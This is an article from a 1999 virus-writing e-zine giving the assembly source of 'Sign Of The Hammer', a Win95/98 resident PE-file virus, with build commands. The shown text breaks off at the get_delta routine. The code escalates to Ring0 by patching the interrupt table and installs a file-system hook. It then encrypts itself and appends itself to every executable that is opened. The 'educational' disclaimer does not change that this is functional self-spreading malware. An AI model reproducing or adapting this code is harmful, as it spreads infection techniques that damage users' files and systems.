ÄÄÄÄÄÄÄ[PVW5.010]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Written for the : Pinoy Virus Writers E-Zine #5

                                % % % % %

                               - = %|% = -

 ÉÍÍÍ   sOuRcEs !!!  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

  Sign Of The Hammer Virus
  By : Lord Julus

  Win95/98  resident  PE  infector
  Will not work on NT
  Features  memory  encrytion and file encryption
  Follows the Manowar virus being it's child

-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä---ÄÄ-Ä--

comment $
                                   ____
                               .ÄÄÄ\  /ÄÄÄ.
                              ³º    \/    º³
                              ³º    /\    º³
                               `ÄÄÄ/  \ÄÄÄ'
                       ÍÍÍÍÍÍÍÍÍÍ» ³ÛÛ³ ÉÍÍÍÍÍÍÍÍÍÍ
                          ÍÍÍÍÍÍÍ¹ ³ÛÛ³ ÌÍÍÍÍÍÍÍ
                            ÍÍÍÍÍ¹ ³ÛÛ³ ÌÍÍÍÍÍ
                             ÍÍÍÍÊÍµÛÛÆÍÊÍÍÍÍ
                                   [//]
                                   [//]
                                   [//]
                                   [//]
                                    ~~

                             SIGN OF THE HAMMER
                            ====================
                                   V.1.0
                            ====================

        DISCLAIMER:

        By  reading this you agree that you are the only one responsible if
 this  piece  of  code  escapes  in  the wild. This program was written for
 educational purposes only and as an object of study. Therefore, the author
 cannot  be  held responsible for any kind of data loss that comes from the
 use of this code.


        This  virus  is  based  on  my  Manowar virus. So, this one has the
 following features:

        - gets Ring0 by modifying the IDT
        - goes resident in the Heap
        - installs a FileSystemHook
        - the FileSystemHook stays encrypted in memory
        - all files are trapped on open (means execute also...)
        - file attributes and time are not preserved (no time to do that)
        - the virus is encrypted in the file

        This is, thus a basic Ring0 virus. No payload.

        In future versions:

                - kill av files
                - preserve attributes and time
                - polymophic
                - move all variables to dynamic memory (optimize size)

        Probably future versions will have a different names.

        Greets: Quantum, SLAM for knowledge
                and Manowar for blasting my ears!!!

        ==============================================================

                         The spell has been broken,
                         The curse has been lifted,
                             Black is the wind
                         On the hills of the gifted
                           Force one to vengeance
                         See your hate in your eyes
                             Called by the gods
                             And giving a sign

                  ALL WORLD POUNDING: "INTO GLORY RIDE!!"
                      SIGN OF THE HAMMER, BE MY GUIDE
                     FINAL WARNING: "ALL STAND ASIDE!!"
                            SIGN OF THE HAMMER,
                              IT'S MY TIME!!!

        ===============================================================

                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                                             ³  Lord Julus - 1999  ³
                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        Assemble with TASM -ml -m3 soth.asm
                      TLINK -Tpe -aa -c soth,,,import32.lib
                      pewrsec soth.exe (or run first gen. from TD32)


        $

;ÜÜÜÜÜ/ Sign Of The Hammer v.1.0 /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

.386p                                        ; stuff...
.model flat, stdcall                         ;
jumps                                        ;

;ÜÜÜÜÜ/ Externals /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

extrn ExitProcess:PROC                       ;

;ÜÜÜÜÜ/ Macros /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

vxdcall macro vxd_id, service_id             ; These are macros used to
      int 20h                                ; call a VxD service or...
      dw service_id                          ;
      dw vxd_id                              ;
endm                                         ;

;ÜÜÜÜÜ/ Equates /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

FALSE                    = 0                 ;
TRUE                     = 1                 ;
DEBUG                    = TRUE              ;
IFSMgr                   = 0040h             ; vxd service
GetHeap                  = 000dh             ; ids...
InstallFileSystemAPIhook = 0067h             ;
Ring0_FileIO             = 0032h             ;
UniToBCSPath             = 0041h             ;
IFSFN_OPEN               = 36                ; open file
IFSFN_RENAME             = 37                ;
R0_OPENCREATFILE         = 0D500h            ; Open/Create a file
R0_READFILE              = 0D600h            ; Read a file, no context
R0_WRITEFILE             = 0D601h            ; Write to a file, no context
R0_CLOSEFILE             = 0D700h            ; Close a file
                                             ;
SEH                      = TRUE              ;
if DEBUG                                     ;
   PAYLOAD               = FALSE             ;
   exception_int         = 5                 ;
   exe_ext               = 'EXE.'            ; you can put smth. else here
else                                         ;
   PAYLOAD               = TRUE              ;
   exception_int         = 3                 ;
   exe_ext               = 'EXE.'            ;
endif                                        ;
                                             ;
virussize                = end-start         ;

;ÜÜÜÜÜ/ Dummy data /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

.data                                        ;
  db 0                                       ;

;ÜÜÜÜÜ/ Code /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

.code                                        ;
                                             ;
start:                                       ;
call_initiator:                              ;
       call get_delta                        ; we get the delta handle
       xchg eax, ebp                         ; and put it into EBP
       jz no_decrypt                         ; if ebp=0 don't decrypt
       call decrypt                          ;
                                             ;
start_crypt label                            ;
no_decrypt:                                  ;
       if SEH                                ;
       mov eax, dword ptr fs:[00H]           ; get the old seh pointer
       mov dword ptr [ebp+SEH_nextpointer], eax; set in structure
       mov dword ptr [ebp+SEH_oldpointer], eax ; and save for restore
       lea eax, [ebp+return_to_host]         ; make it point here...
       mov dword ptr [ebp+SEH_errorhandler], eax;
       lea eax, [ebp+SEH_nextpointer]        ;
       mov dword ptr fs:[00H], eax           ; and point the structure
       endif                                 ;
                                             ;
       sidt [ebp+IDT_Address]                ; Get interrupt address
       mov esi, dword ptr [ebp+IDT_Address+2]; (first 2 are the length)
       add esi, exception_int*8              ; get the offset for Int
       mov dword ptr [ebp+exception], esi    ; save exception place
       mov bx, word ptr [esi+6]              ; get low word
       shl ebx, 10H                          ; shift left
       mov bx, word ptr [esi]                ; get high word
       mov dword ptr [ebp+old_offset], ebx   ; save exception offset
       lea eax, [ebp+offset Ring0]           ; eax=new Int handler
       mov word ptr [esi], ax                ; store high word
       shr eax, 10H                          ; shift right
       mov word ptr [esi+6], ax              ; and store low word
                                             ;
       mov eax, 0c000e990h                   ; check residency mark...
       cmp dword ptr [eax], 'SOTH'           ;
       jne go_on_to_ring0                    ;
       jmp already_installed                 ;
                                             ;
go_on_to_ring0:                              ;
       int exception_int                     ; Generate exception -> Ring0 !
                                             ;
already_installed:                           ;
       mov esi, dword ptr [ebp+exception]    ; restore IDT address
       mov ebx, dword ptr [ebp+old_offset]   ; restore exception offset
       mov word ptr [esi], bx                ; restore exception
       shr ebx, 10H                          ; handler
       mov word ptr [esi+6], bx              ;
                                             ;
return_to_host:                              ;
       if SEH                                ;
       mov eax, dword ptr [ebp+SEH_oldpointer]; restore the old SEH pointer
       mov dword ptr fs:[00H], eax           ;
       endif                                 ;
                                             ;
exit:                                        ;
       cmp ebp, 0                            ; if generation 1 do a normal
       je generation_1                       ; exit,
       mov eax, [ebp+Old_EIP]                ; otherwise return to the
       add eax, [ebp+imagebase]              ; original host's EIP
       jmp eax                               ;
                                             ;
generation_1:                                ;
       Push 0                                ;
       Call ExitProcess                      ; and exit

;ÜÜÜÜÜ/ Ring 0 stuff /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

Ring0 proc                                   ; Here we are at Ring0
       pushad                                ; save registers
       mov eax, (end-start)*2+100            ; memory needed
       push eax                              ;
                                             ;
fix_1_value equ GetHeap+256*256*IFSMgr       ; fix dword for GetHeap
fix_1:                                       ;
       vxdcall IFSMgr, GetHeap               ; get it!
       pop ecx                               ; in ecx...
       or eax, eax                           ; did we make it?
       jz no_free_mem                        ;
                                             ;
       xchg eax, edi                         ; EDI = new free memory area
       lea esi, dword ptr [ebp+start]        ; ESI = start of virus
       push edi                              ;
       mov ecx, end-start                    ;
       rep movsb                             ; copy virus...
       pop edi                               ;
       mov dword ptr [edi+delta1-start], edi ;
       mov dword ptr [edi+delta2-start], edi ;
       mov dword ptr [ebp+delta2], edi       ;
                                             ;
       call mem_crypt                        ;
                                             ;
       lea eax, [edi+API_hook-start]         ; FSAPI hook
       push eax                              ;
                                             ;
fix_2_value equ InstallFileSystemAPIhook+256*256*IFSMgr;
fix_2:                                       ;
       vxdcall IFSMgr, InstallFileSystemAPIhook; install new handler
       pop ebx                               ; just to restore stack
       mov [edi+nexthook-start], eax         ; save the old hook handler
                                             ;
       jmp install_success                   ;
                                             ;
no_free_mem:                                 ;
       jmp exit_to_ring3                     ;
                                             ;
install_success:                             ;
       mov eax, 0c000e990h                   ; mark as resident
       mov dword ptr [eax], 'SOTH'           ;
       mov byte ptr [edi+flag-start], 0      ; reset flag
                                             ;
exit_to_ring3:                               ;
       popad                                 ; restore regs
       iretd                                 ; Get out of R0
Ring0 endp                                   ;
                                             ;
mem_crypt proc near                          ; this encrypts or decrypts
       push edi esi ecx eax                  ; the memory occupied by the
       db 0bfh                               ; FileSystemHook.
delta2 dd 0                                  ;
       add edi, offset start_area            ;
       sub edi, offset start                 ;
       mov esi, edi                          ;
       mov ecx, end_area-start_area          ;
                                             ;
cipher_loop:                                 ;
       lodsb                                 ;
       xor al, 11h                           ;
       stosb                                 ;
       loop cipher_loop                      ;
                                             ;
       pop eax ecx esi edi                   ;
       ret                                   ;
mem_crypt endp                               ;

;ÜÜÜÜÜ/ Control gets here on file I/O /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

API_hook:                                    ;
        push ebp                             ; C-like enter
        mov ebp, esp                         ;
        sub esp, 20h                         ;
                                             ;
        push ebx                             ;
        push esi                             ;
        push edi                             ;
                                             ;
        db 0bfh                              ; EDI = new delta handle in mem
delta1  dd 0                                 ;
        sub edi, offset start                ; align completely
                                             ;
        cmp byte ptr [edi+flag], 1           ; safety flag (prevents reentry)
        je over_now                          ;
                                             ;
        cmp dword ptr [ebp+12], IFSFN_OPEN   ; is this an openfile call ?
        jne over_now                         ;
                                             ;
        call mem_crypt                       ; decrypt memory
start_area label                             ;
                                             ;
        mov byte ptr [edi+flag], 1           ; set our reentrance flag
                                             ;
        pusha                                ; push all regs
                                             ;
        lea esi, [edi+filename]              ;
        mov eax, [ebp+16]                    ; get drive type (1=A)
        cmp al, 0ffh                         ; bigger
        je no_path                           ; then -> problem
        add al, 40h                          ; align to ASCII
        mov byte ptr [esi], al               ;
        inc esi                              ;
        mov byte ptr [esi], ':'              ;
        inc esi                              ;
        mov byte ptr [esi], '\'              ; we have a 'c:\' now...
                                             ;
no_path:                                     ;
        push 0                               ; prepare for unicode conversion
        push 260                             ; maximum filename
        mov eax, [ebp+28]                    ; get IOREQ
        mov eax, [eax+12]                    ;
        add eax, 4                           ;
        push eax                             ;
        push esi                             ;
                                             ;
fix_3_value equ UniToBCSPath+256*256*IFSMgr  ;
fix_3:                                       ;
        vxdcall IFSMgr, UniToBCSPath         ; Convert name!!
        add esp, 4*4                         ; restore stack
        add esi, eax                         ; eax = length
        mov byte ptr [esi], 0                ; make it ASCIIZ string
                                             ;
        if DEBUG                             ;
        cmp dword ptr [esi-8], 'TAOG'        ; if debug is on search only
        jne notexe                           ; for GOAT.EXE
        endif                                ;
        cmp dword ptr [esi-4], exe_ext       ;
        jne notexe                           ;
                                             ;
        lea esi, [edi+filename]              ; let's open the file
        mov bx, 2                            ;
        mov cx, 0                            ;
        mov dx, 1                            ;
        call fileopen
        jc notexe                            ;
        mov dword ptr [edi+handle], eax; save handle
                                             ;
        lea esi, [edi+my_mz_header]          ; read MZ dos header
        mov ecx, IMAGE_DOS_HEADER_SIZE       ; size of mz header
        mov edx, 0                           ; pointer in file
        call fileread                        ;
                                             ;
        lea esi, [edi+my_mz_header]          ;
        cmp word ptr [esi.MZ_magic], 5A4Dh   ; is the Magic sign there?
        jne fileclose                        ;
                                             ;
        mov esi, dword ptr [esi.MZ_lfanew]   ; locate PE header
        cmp esi, 500h                        ; is PE header very far away?
        ja fileclose                         ;
                                             ;
        mov dword ptr [edi+crt_move], esi    ; save our movement in file
        mov dword ptr [edi+peheader], esi    ;
                                             ;
        lea edx, [edi+my_pe_header]          ; Read the PE header
        mov ecx, IMAGE_FILE_HEADER_SIZE+IMAGE_OPTIONAL_HEADER_SIZE
        xchg esi, edx                        ;
        call fileread                        ;
                                             ;
        add dword ptr [edi+crt_move],\       ; increase our movement
                      IMAGE_FILE_HEADER_SIZE +  \ ; in the file
                      IMAGE_OPTIONAL_HEADER_SIZE  ;
                                             ;
        lea esi, [edi+my_pe_header]          ;
        cmp dword ptr [esi.PE_Magic], 00004550h ; 'PE'/0/0 ?
        jne fileclose                        ;
                                             ;
        cmp word ptr [esi.Characteristics], 2000h ; Library?
        je fileclose                         ;
                                             ;
                                             ; let's search the last section
        xor eax, eax                         ; header start
        mov ax, word ptr [esi.NumberOfSections]; EAX = HOW MANY SECTIONS
        mov ecx, IMAGE_SECTION_HEADER_SIZE   ;   ECX = SIZE OF SECTION
        dec eax                              ; looking for the last.
        mul ecx                              ; we found the displacement
        mov esi, eax                         ; displacement
        add esi, dword ptr [edi+crt_move]    ; align entire displacement
        mov dword ptr [edi+sec_ptr], esi     ; save section header place
                                             ;
        lea edx, [edi+my_section]            ; read the last section
        mov ecx, IMAGE_SECTION_HEADER_SIZE   ;
        xchg esi, edx                        ;
        call fileread                        ;
                                             ;
        lea esi, [edi+my_oh_header]          ; save various stuff in PE header
                                             ;
        cmp dword ptr [esi.OH_Win32VersionValue], 'SOTH'; already infected?
        je fileclose                         ;
                                             ;
        mov eax, dword ptr [esi.OH_SectionAlignment]    ; Section align
        mov [edi+S_Align], eax                          ;
        mov eax, dword ptr [esi.OH_FileAlignment]       ; File align
        mov [edi+F_Align], eax                          ;
        mov eax, dword ptr [esi.OH_AddressOfEntryPoint] ; Original EIP
        mov [edi+Old_EIP], eax                          ;
        mov eax, dword ptr [esi.OH_SizeOfImage]         ; Size of image
        mov [edi+SOI], eax                              ;
        mov eax, dword ptr [esi.OH_ImageBase]           ; Image base
        mov [edi+imagebase], eax                        ;
                                                        ;
        lea esi, [edi+my_section]            ; point the last section
        mov eax, dword ptr [esi.SH_PointerToRawData];
        add eax, dword ptr [esi.SH_VirtualSize]   ;
        mov dword ptr [edi+virusplace], eax       ; save virus place in file
        mov eax, dword ptr [esi.SH_SizeOfRawData] ;
        add eax, virussize                        ; increase sizeofrawdata
        mov ecx, dword ptr [edi+F_Align]     ; and align it to the file
        push eax                             ; alignment
        push ecx                             ;
        xor edx, edx                         ;
        div ecx                              ;
        pop ecx                              ;
        sub ecx, edx                         ;
        pop eax                              ;
        add eax, ecx                         ;
        mov dword ptr [esi.SH_SizeOfRawData], eax ; and store it
        mov eax, dword ptr [esi.SH_VirtualSize] ; and now increase VirtualSize
        add eax, virussize                   ; with the virus length
        mov dword ptr [esi.SH_VirtualSize], eax ;
                                             ;
        or dword ptr [esi.SH_Characteristics], 0E0000020h ; writable section
                                             ;
        lea esi, [edi+my_oh_header]          ; point PE header
        mov eax, dword ptr [edi+SOI]         ; Get OldSizeOfImage
        add eax, virussize                   ; increase it and then
        mov ecx, dword ptr [edi+S_Align]     ; align it to the section
        push eax                             ; alignment
        push ecx                             ;
        xor edx, edx                         ;
        div ecx                              ;
        pop ecx                              ;
        sub ecx, edx                         ;
        pop eax                              ;
        add eax, ecx                         ;
        mov dword ptr [esi.OH_SizeOfImage], eax ;
                                             ;
        lea esi, [edi+my_section]            ; point section again
        mov eax, dword ptr [esi.SH_VirtualAddress];
        add eax, dword ptr [esi.SH_VirtualSize];
        sub eax, virussize                   ; and get the new EIP in eax
                                             ;
        mov ebx, [edi+imagebase]             ; align start of code to
        add ebx, start_crypt-start           ; decrypt in the decrypt
        add ebx, eax                         ; procedure
        mov dword ptr [edi+strt], ebx        ;
                                             ;
        lea esi, [edi+my_oh_header]          ;
        mov dword ptr [esi.OH_AddressOfEntryPoint], eax ;
        mov dword ptr [esi.OH_Win32VersionValue], 'SOTH'; inf. marker...
                                             ;
        lea esi, [edi+my_section]            ; write new section to file
        mov ecx, IMAGE_SECTION_HEADER_SIZE   ;
        mov edx, dword ptr [edi+sec_ptr]     ;
        call filewrite                       ;
                                             ;
        lea esi, [edi+my_pe_header]          ; write new PEheader to file
        mov ecx, IMAGE_FILE_HEADER_SIZE+\    ;
                 IMAGE_OPTIONAL_HEADER_SIZE  ;
        mov edx, dword ptr [edi+peheader]    ;
        call filewrite                       ;

; Before writing the virus body to the victim, we must restore the vxdcalls

        mov cx, 20cdh                        ; The VxD call must look like
        mov word ptr [edi+fix_1], cx         ;      this:
        mov eax, fix_1_value                 ;      Int 20h
        mov dword ptr [edi+fix_1+2], eax     ;      dw service
        mov word ptr [edi+fix_2], cx         ;      dw vxd
        mov eax, fix_2_value                 ;
        mov dword ptr [edi+fix_2+2], eax     ; Here we simply restore them
        mov word ptr [edi+fix_3], cx         ; because at runtime they get
        mov eax, fix_3_value                 ; changed to call [some address]
        mov dword ptr [edi+fix_3+2], eax     ;
        mov word ptr [edi+fix_4], cx         ;
        mov eax, fix_4_value                 ;
        mov dword ptr [edi+fix_4+2], eax     ;
                                             ;
        call random32                        ; get random key
        mov dword ptr [edi+key], eax         ;
        mov edx, eax                         ; save key
                                             ;
        push edi                             ; move virus to end of code
        mov esi, end-start                   ; in order to crypt it.
        add esi, edi                         ;
        xchg edi, esi                        ;
        add edi, offset start                ;
        add esi, offset start                ;
        mov ecx, end-start                   ;
        push edi                             ;
        rep movsb                            ;
        pop edi                              ;
                                             ;
        add edi, start_crypt-start           ; and encrypt it in there
        mov esi, edi                         ;
        mov ecx, (end_crypt-start_crypt)/4   ;
                                             ;
encrypt:                                     ;
        lodsd                                ;
        xor eax, edx                         ; with the saved key
        stosd                                ;
        loop encrypt                         ;
        pop edi                              ;
                                             ;
        mov edx, edi                         ; write virus to file
        add edx, offset start                ; (encrypted)
        add edx, end-start                   ;
        mov ecx, virussize                   ;
        mov esi, dword ptr [edi+virusplace]  ;
        xchg edx, esi                        ;
        call filewrite                       ;
                                             ;
fileclose:                                   ;
        call closefile                       ;
                                             ;
notexe:                                      ;
        popa                                 ; restore regs
                                             ;
end_area label                               ;
        call mem_crypt                       ; recrypt memory!!
                                             ;
over_now:                                    ;
        mov byte ptr [edi+flag], 0           ; reset flag
        push dword ptr [ebp+28]              ; push the original arguments
        push dword ptr [ebp+24]              ; back on the stack
        push dword ptr [ebp+20]              ;
        push dword ptr [ebp+16]              ;
        push dword ptr [ebp+12]              ;
        push dword ptr [ebp+8]               ;
                                             ;
        db 0b8h                              ; mov eax, nexthook
nexthook dd 0                                ;
        call [eax]                           ; ...and call old hook address
                                             ;
        add esp, 6*4                         ; restore stack
                                             ;
        pop edi                              ; restore regs
        pop esi                              ;
        pop ebx                              ;
                                             ;
        leave                                ; and flee...
        ret                                  ;
                                             ;
fix_4_value equ Ring0_FileIO+256*256*IFSMgr  ;
fix_4:                                       ;
Ring0_File_IO:                               ;
        vxdcall IFSMgr, Ring0_FileIO         ;
        ret                                  ;
                                             ;
;ÜÜÜÜÜ/ VxD call routines /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

fileopen:
        mov eax, R0_OPENCREATFILE
        call Ring0_File_IO
        ret

closefile:
        mov eax, R0_CLOSEFILE
        call do_call
        ret

fileread:
        mov eax, R0_READFILE
        call do_call
        ret

filewrite:
        mov eax, R0_WRITEFILE
        call do_call
        ret

do_call:
        mov ebx, dword ptr [edi+handle]
        call Ring0_File_IO
        ret

;ÜÜÜÜÜ/ Random routine /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

random32 proc near                       ;
      call random16                      ; this is the random 32 bit
      shl eax, 10h                       ; generator (puts 2 random 16 bit
                                         ; in each side of EAX)
random16:                                ;
      push ebx                           ; this procedure here gets a
      xor bx, 0F00Dh                     ; random word by reading different
      in al, 40h                         ; ports.
      xor bl, al                         ;
      in al, 42h                         ;
      add bh, al                         ;
      in al, 41h                         ;
      sub bl, al                         ;
      in al, 41h                         ;
      xor bh, al                         ;
      in al, 42h                         ;
      add bl, al                         ;
      in al, 40h                         ;
      sub bh, al                         ;
      xchg bx, ax                        ;
      pop ebx                            ;
      ret                                ;
random32 endp                            ;

; Debug beep ----------------------------------
comment %
beep:
       pushad
       mov ax, 1000
       mov bx, 200
       mov cx, ax
       mov al, 0b6h
       out 43h, al
       mov dx, 0012h
       mov ax, 34dch
       div cx
       out 42h, al
       mov al, ah
       out 42h, al
       in al, 61h
       mov ah, al
       or al, 03h
       out 61h, al
       l1:
       mov ecx, 4680
       l2:
       loop l2
       dec bx
       jnz l1
       mov al, ah
       out 61h, al
       popad
       ret
;---------------------------------------------------------
       %

;ÜÜÜÜÜ/ Data /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

copyright        db "Sign Of The Hammer V.1.0      "
                 db "written by Lord Julus (c) 1999"
IDT_Address      dq 0                        ; IDT address
exception        dd 0                        ; exception place
old_offset       dd 0                        ; real old offset
filename         db 260 dup (0)              ; victim's name
flag             db 0                        ;
handle           dd 0                        ; victim's handle
crt_move         dd 0                        ; current movement in file
sec_ptr          dd 0                        ; pointer to section
Old_EIP          dd 0                        ; Old Entry point
S_Align          dd 0                        ; section alignment
F_Align          dd 0                        ; file alignment
SOI              dd 0                        ; size of image
peheader         dd 0                        ; pe header address
virusplace       dd 0                        ; virus place in victim
imagebase        dd 0                        ; imagebase of victim
                                             ;
if SEH                                       ;
SEH_oldpointer   dd ?                        ; SEH saved pointer
SEH_nextpointer  dd ?                        ; SEH structure... old pointer
SEH_errorhandler dd ?                        ;                  new pointer
endif                                        ;

;ÜÜÜÜÜ/ File header structures /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

IMAGE_DOS_HEADER STRUC            ; DOS .EXE header
    MZ_magic      DW ?            ; Magic number
    MZ_cblp       DW ?            ; Bytes on last page of file
    MZ_cp         DW ?            ; Pages in file
    MZ_crlc       DW ?            ; Relocations
    MZ_cparhdr    DW ?            ; Size of header in paragraphs
    MZ_minalloc   DW ?            ; Minimum extra paragraphs needed
    MZ_maxalloc   DW ?            ; Maximum extra paragraphs needed
    MZ_ss         DW ?            ; Initial (relative) SS value
    MZ_sp         DW ?            ; Initial SP value
    MZ_csum       DW ?            ; Checksum
    MZ_ip         DW ?            ; Initial IP value
    MZ_cs         DW ?            ; Initial (relative) CS value
    MZ_lfarlc     DW ?            ; File address of relocation table
    MZ_ovno       DW ?            ; Overlay number
    MZ_res        DW 4 DUP(?)     ; Reserved words
    MZ_oemid      DW ?            ; OEM identifier (for MZ_oeminfo)
    MZ_oeminfo    DW ?            ; OEM information; MZ_oemid specific
    MZ_res2       DW 10 DUP(?)    ; Reserved words
    MZ_lfanew     DD ?            ; File address of new exe header
IMAGE_DOS_HEADER ENDS             ;
IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
                                  ;
IMAGE_FILE_HEADER STRUC           ; Portable Exe File
    PE_Magic                 DD ? ;
    Machine                  DW ? ; Machine type
    NumberOfSections         DW ? ; Number of sections
    TimeDateStamp            DD ? ; Date and Time
    PointerToSymbolTable     DD ? ; Pointer to Symbols
    NumberOfSymbols          DD ? ; Number of Symbols
    SizeOfOptionalHeader     DW ? ; Size of Optional Header
    Characteristics          DW ? ; File characteristics
IMAGE_FILE_HEADER ENDS            ;
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER

IMAGE_DATA_DIRECTORY STRUC                         ; Image data directory
    DD_VirtualAddress DD ?                         ; Virtual address
    DD_Size           DD ?                         ; Virtual size
IMAGE_DATA_DIRECTORY ENDS                          ;
                                                   ;
IMAGE_DIRECTORY_ENTRIES STRUC                      ; All directories
    DE_Export           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Import           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Resource         IMAGE_DATA_DIRECTORY    ?  ;
    DE_Exception        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Security         IMAGE_DATA_DIRECTORY    ?  ;
    DE_BaseReloc        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Debug            IMAGE_DATA_DIRECTORY    ?  ;
    DE_Copyright        IMAGE_DATA_DIRECTORY    ?  ;
    DE_GlobalPtr        IMAGE_DATA_DIRECTORY    ?  ;
    DE_TLS              IMAGE_DATA_DIRECTORY    ?  ;
    DE_LoadConfig       IMAGE_DATA_DIRECTORY    ?  ;
    DE_BoundImport      IMAGE_DATA_DIRECTORY    ?  ;
    DE_IAT              IMAGE_DATA_DIRECTORY    ?  ;
IMAGE_DIRECTORY_ENTRIES ENDS                       ;
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16              ;
                                                   ;
IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
    OH_Magic                        DW ?           ; Magic word
    OH_MajorLinkerVersion           DB ?           ; Major Linker version
    OH_MinorLinkerVersion           DB ?           ; Minor Linker version
    OH_SizeOfCode                   DD ?           ; Size of code section
    OH_SizeOfInitializedData        DD ?           ; Initialized Data
    OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
    OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
    OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
    OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
    OH_ImageBase                    DD BYTE PTR ?  ; Base of image
    OH_SectionAlignment             DD ?           ; Section Alignment
    OH_FileAlignment                DD ?           ; File Alignment
    OH_MajorOperatingSystemVersion  DW ?           ; Major OS
    OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
    OH_MajorImageVersion            DW ?           ; Major Image version
    OH_MinorImageVersion            DW ?           ; Minor Image version
    OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
    OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
    OH_Win32VersionValue            DD ?           ; win32 version
    OH_SizeOfImage                  DD ?           ; Size of image
    OH_SizeOfHeaders                DD ?           ; Size of Header
    OH_CheckSum                     DD ?           ; unused
    OH_Subsystem                    DW ?           ; Subsystem
    OH_DllCharacteristics           DW ?           ; DLL characteristic
    OH_SizeOfStackReserve           DD ?           ; Stack reserve
    OH_SizeOfStackCommit            DD ?           ; Stack commit
    OH_SizeOfHeapReserve            DD ?           ; Heap reserve
    OH_SizeOfHeapCommit             DD ?           ; Heap commit
    OH_LoaderFlags                  DD ?           ; Loader flags
    OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
                                    UNION          ; directory entries
    OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                    IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
    OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                    ENDS           ;
    ENDS                                           ;
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
                                                   ;
IMAGE_SECTION_HEADER STRUC                         ; Section hdr.
    SH_Name                 DB 8 DUP(?)            ; name
                            UNION                  ;
    SH_PhysicalAddress      DD BYTE PTR ?          ; Physical address
    SH_VirtualSize          DD ?                   ; Virtual size
                            ENDS                   ;
    SH_VirtualAddress       DD BYTE PTR ?          ; Virtual address
    SH_SizeOfRawData        DD ?                   ; Raw data size
    SH_PointerToRawData     DD BYTE PTR ?          ; pointer to raw data
    SH_PointerToRelocations DD BYTE PTR ?          ; ...
    SH_PointerToLinenumbers DD BYTE PTR ?          ; ...... not really used
    SH_NumberOfRelocations  DW ?                   ; ....
    SH_NumberOfLinenumbers  DW ?                   ; ..
    SH_Characteristics      DD ?                   ; flags
IMAGE_SECTION_HEADER ENDS                          ;
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
                                                   ;
my_mz_header IMAGE_DOS_HEADER      <0>               ; our real data comes
my_pe_header IMAGE_FILE_HEADER     <0>               ; here...
my_oh_header IMAGE_OPTIONAL_HEADER <0>               ;
my_section   IMAGE_SECTION_HEADER  <0>               ;

end_crypt label

;ÜÜÜÜÜ/ Run-time decryptor /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

decrypt proc near                                  ;
       db 0bfh                                     ; mov edi, start of code
strt   dd 0                                        ; the destination
       mov esi, edi                                ; the source
       mov ecx, (end_crypt-start_crypt)/4          ; the length
                                                   ;
crypt_loop:                                        ;
       lodsd                                       ; load
       db 35h                                      ; decrypt
key    dd 0                                        ; store
       stosd                                       ;
       loop crypt_loop                             ; loop
       ret                                         ; and return
decrypt endp                                       ;

;ÜÜÜÜÜ/ Get Delta C-like struc /ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

get_delta:                               ;
